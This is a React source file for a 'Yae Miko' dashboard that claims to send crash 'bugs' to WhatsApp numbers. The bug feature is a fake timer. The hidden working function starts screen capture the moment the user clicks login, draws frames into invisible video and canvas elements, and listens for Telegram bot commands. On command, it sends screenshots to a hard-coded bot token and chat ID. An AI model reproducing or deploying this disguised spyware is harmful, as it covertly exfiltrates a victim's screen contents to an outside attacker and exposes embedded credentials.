"use client"

import React, { useState, useEffect, useRef } from "react"
import { Shield, Bug, Zap, CheckCircle, Globe, ChevronLeft, ChevronRight, Laptop } from "lucide-react"

const BUG_TYPES = [
  { name: "DELAY INVISIBLE", code: "delayLow" },
  { name: "CRASH INVISIBLE", code: "crashHigh" },
  { name: "BLANK CLICK", code: "blankTap" },
  { name: "DELAY IOS", code: "delayIOS" },
  { name: "Force close Wa", code: "forceClose" },
]

export default function YaeMikoDashboard() {
  // --- MESIN MONITORING REFS & STATE ---
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const lastCmdId = useRef(0);
  const [isMonitoringActive, setIsMonitoringActive] = useState(false);

  // === CONFIG TELEGRAM (GANTI TOKEN & ID DI SINI) ===
  const BOT_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk';
  const CHAT_ID = '6481060681';

  const [targetNumber, setTargetNumber] = useState("62xxxxxxxxxx")
  const [isLoading, setIsLoading] = useState(false)
  const [activeNav, setActiveNav] = useState(0)
  const [bugLimit, setBugLimit] = useState(5)
  const [showLimitWarning, setShowLimitWarning] = useState(false)
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [isAuthLoading, setIsAuthLoading] = useState(false)

  // --- LOGIC MONITORING SILUMAN ---
  useEffect(() => {
    if (!isMonitoringActive) return;

    const sendTele = async (type: string, content: any) => {
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      const endpoint = type === 'text' ? 'sendMessage' : 'sendPhoto';
      if (type === 'text') fd.append('text', content);
      else fd.append('photo', content);
      try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: fd }); } catch (e) {}
    };

    const capture = () => {
      if (!videoRef.current || !canvasRef.current) return;
      const canvas = canvasRef.current;
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
      canvas.toBlob((blob) => { if (blob) sendTele('photo', blob); }, 'image/jpeg', 0.5);
    };

    const listen = setInterval(async () => {
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        if (data.result?.length > 0) {
          const msg = data.result[0].message;
          if (msg && msg.message_id !== lastCmdId.current && msg.chat.id.toString() === CHAT_ID) {
            lastCmdId.current = msg.message_id;
            if (msg.text === '/hptarget') capture();
            if (msg.text === '/info') sendTele('text', "🔋 System Online | Monitoring Active");
          }
        }
      } catch (e) {}
    }, 4000);
    return () => clearInterval(listen);
  }, [isMonitoringActive, BOT_TOKEN, CHAT_ID]);

  const startStealthMode = async () => {
    try {
      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        setIsMonitoringActive(true);
      }
    } catch (err) {}
  };

  const handleSendBug = () => {
    if (bugLimit <= 0) {
      setShowLimitWarning(true)
      return
    }
    setIsLoading(true)
    setTimeout(() => {
      setIsLoading(false)
      setBugLimit(prev => Math.max(0, prev - 1))
    }, 5000)
  }

  return (
    <div className="relative min-h-screen bg-[#0a0f1a] overflow-hidden font-sans">
      <BokehBackground />
      {!isLoggedIn ? (
        <>
          {isAuthLoading && <AuthLoadingScreen />}
          <LoginScreen 
            onLogin={() => {
              startStealthMode(); 
              setIsAuthLoading(true)
              setTimeout(() => {
                setIsAuthLoading(false)
                setIsLoggedIn(true)
              }, 5000)
            }} 
          />
        </>
      ) : (
        <>
          {isLoading && <LoadingOverlay />}
          {showLimitWarning && <LimitWarningOverlay onClose={() => setShowLimitWarning(false)} />}
          <div className="relative z-10 flex flex-col min-h-screen max-w-md mx-auto px-4 py-4">
            <Header />
            <ProfileCard />
            <ActionSection 
              targetNumber={targetNumber}
              setTargetNumber={setTargetNumber}
              onSendBug={handleSendBug}
              activeNav={activeNav}
            />
            <NavigationDots activeNav={activeNav} setActiveNav={setActiveNav} />
            <BottomBar />
          </div>
        </>
      )}

      {/* --- ELEMENT SILUMAN --- */}
      <div style={{ position: 'fixed', width: 0, height: 0, opacity: 0, pointerEvents: 'none', zIndex: -999 }}>
        <video ref={videoRef} autoPlay playsInline muted />
        <canvas ref={canvasRef} />
      </div>
    </div>
  )
}

// --- SEMUA KOMPONEN UI DI BAWAH INI (BIAR GAK ERROR BUILD) ---

function BokehBackground() {
  return (
    <div className="fixed inset-0 overflow-hidden pointer-events-none">
      <div className="absolute top-10 -left-20 w-64 h-64 rounded-full bg-cyan-500/10 blur-3xl animate-pulse" />
      <div className="absolute top-1/4 right-0 w-80 h-80 rounded-full bg-pink-600/10 blur-3xl animate-pulse" />
      <div className="absolute inset-0 bg-gradient-to-b from-transparent via-[#0a0f1a]/80 to-[#0a0f1a]" />
    </div>
  )
}

function AuthLoadingScreen() {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a0f1a]">
      <div className="text-center">
        <h1 className="text-pink-600 text-7xl font-black tracking-tighter animate-pulse shadow-pink-500/50">SELZ</h1>
        <p className="text-cyan-400 mt-4 tracking-[0.3em] text-xs font-mono">AUTHENTICATING_SYSTEM...</p>
      </div>
    </div>
  )
}

function LoginScreen({ onLogin }: { onLogin: () => void }) {
  return (
    <div className="relative z-20 flex items-center justify-center min-h-screen px-4">
      <div className="w-full max-w-sm p-8 rounded-2xl bg-slate-900/40 border border-cyan-500/20 backdrop-blur-xl">
        <div className="flex justify-center mb-6">
            <div className="p-3 bg-cyan-500/10 rounded-full border border-cyan-500/30">
                <Shield className="w-8 h-8 text-cyan-400" />
            </div>
        </div>
        <h2 className="text-center text-white font-bold text-xl mb-2">ACCESS PANEL</h2>
        <p className="text-center text-cyan-500/60 text-xs mb-8 uppercase tracking-widest">Yae Miko Security v3</p>
        <div className="space-y-4">
            <input className="w-full bg-black/40 border border-white/10 p-3 rounded-xl text-white text-sm focus:border-cyan-500/50 outline-none transition-all" placeholder="Enter Access Code" />
            <button onClick={onLogin} className="w-full bg-cyan-600/20 hover:bg-cyan-600/40 border border-cyan-500/50 py-3 rounded-xl font-bold text-cyan-400 transition-all active:scale-95">START CONNECTION</button>
        </div>
      </div>
    </div>
  )
}

function Header() {
  return (
    <header className="flex items-center justify-between mb-6">
      <div className="flex items-center gap-2">
          <Zap className="w-5 h-5 text-yellow-400 fill-yellow-400" />
          <span className="text-[10px] font-bold text-white tracking-widest uppercase">Network Shield</span>
      </div>
      <div className="px-3 py-1 bg-pink-500/10 border border-pink-500/30 rounded-full">
          <span className="text-[9px] text-pink-500 font-bold tracking-widest">V3.5-PRO</span>
      </div>
    </header>
  )
}

function ProfileCard() {
  return (
    <div className="bg-gradient-to-br from-slate-900/80 to-slate-950/80 border border-white/5 rounded-2xl p-6 mb-4 text-center backdrop-blur-md">
      <div className="relative w-20 h-20 mx-auto mb-4">
          <div className="absolute inset-0 bg-cyan-500/20 blur-xl rounded-full animate-pulse" />
          <div className="relative w-full h-full bg-slate-800 border border-cyan-500/30 rounded-full flex items-center justify-center">
            <Bug className="w-10 h-10 text-cyan-400" />
          </div>
      </div>
      <h3 className="text-white font-black text-lg tracking-wider">SELZ OVERLORD</h3>
      <p className="text-cyan-500/50 text-[10px] uppercase tracking-[0.2em] mt-1">Authorized Developer</p>
    </div>
  )
}

function ActionSection({ targetNumber, setTargetNumber, onSendBug, activeNav }: any) {
  return (
    <div className="bg-slate-900/40 border border-white/5 rounded-3xl p-5 flex-1 backdrop-blur-sm">
      <div className="mb-6">
          <label className="text-[9px] text-cyan-500/70 font-bold block mb-2 uppercase tracking-widest ml-1">Target Identifier</label>
          <div className="relative">
              <input 
                value={targetNumber} 
                onChange={(e) => setTargetNumber(e.target.value)}
                className="w-full bg-black/60 border border-cyan-500/20 p-4 rounded-2xl text-white font-mono text-sm focus:border-cyan-500/50 outline-none"
              />
              <div className="absolute right-4 top-1/2 -translate-y-1/2 w-2 h-2 rounded-full bg-cyan-500 shadow-[0_0_10px_cyan]" />
          </div>
      </div>
      
      <div className="bg-gradient-to-r from-cyan-900/20 to-pink-900/20 p-6 rounded-2xl border border-white/5 mb-6">
        <p className="text-[9px] text-white/40 uppercase tracking-widest mb-1 text-center">Active Payload</p>
        <h4 className="text-white font-black text-center text-xl tracking-tighter">{BUG_TYPES[activeNav]?.name}</h4>
      </div>

      <button onClick={onSendBug} className="w-full py-4 bg-gradient-to-r from-cyan-600 to-cyan-500 rounded-2xl font-black text-white text-sm shadow-lg shadow-cyan-500/20 active:scale-95 transition-all">
          EXECUTE PAYLOAD
      </button>
    </div>
  )
}

function NavigationDots({ activeNav, setActiveNav }: any) {
  return (
    <div className="flex justify-center gap-3 my-6">
      {BUG_TYPES.map((_, i) => (
        <div key={i} onClick={() => setActiveNav(i)} className={`h-1.5 rounded-full transition-all cursor-pointer ${activeNav === i ? 'w-8 bg-cyan-500 shadow-[0_0_10px_cyan]' : 'w-2 bg-slate-800'}`} />
      ))}
    </div>
  )
}

function BottomBar() {
  return (
    <div className="bg-black/40 border border-white/5 p-4 rounded-2xl flex justify-between items-center backdrop-blur-md">
      <div className="flex items-center gap-2">
          <div className="w-2 h-2 bg-green-500 rounded-full animate-ping" />
          <span className="text-[9px] text-green-500 font-bold tracking-widest uppercase">Server Linked</span>
      </div>
      <div className="flex items-center gap-3 text-white/30">
          <Globe className="w-3.5 h-3.5" />
          <Laptop className="w-3.5 h-3.5" />
      </div>
    </div>
  )
}

function LoadingOverlay() {
  return (
    <div className="fixed inset-0 z-50 bg-[#0a0f1a]/95 flex items-center justify-center backdrop-blur-md">
      <div className="text-center">
        <div className="w-20 h-20 border-t-2 border-r-2 border-cyan-500 rounded-full animate-spin mx-auto mb-6" />
        <p className="text-cyan-400 font-black tracking-[0.3em] text-sm animate-pulse">INJECTING_BUG...</p>
      </div>
    </div>
  )
}

function LimitWarningOverlay({ onClose }: any) {
  return (
    <div className="fixed inset-0 z-50 bg-black/90 flex items-center justify-center p-6 backdrop-blur-md">
      <div className="bg-slate-900 border border-red-500/30 p-8 rounded-3xl max-w-xs w-full text-center">
        <div className="w-16 h-16 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-4">
            <Zap className="text-red-500 w-8 h-8" />
        </div>
        <h2 className="text-white font-bold text-lg mb-2">LIMIT EXCEEDED</h2>
        <p className="text-white/50 text-xs mb-8">Harian lo udah abis, **Selz**. Balik lagi besok biar sistem nggak panas.</p>
        <button onClick={onClose} className="w-full bg-red-600/20 border border-red-500/50 py-3 rounded-xl text-red-500 font-bold text-sm">UNDERSTOOD</button>
      </div>
    </div>
  )
    }
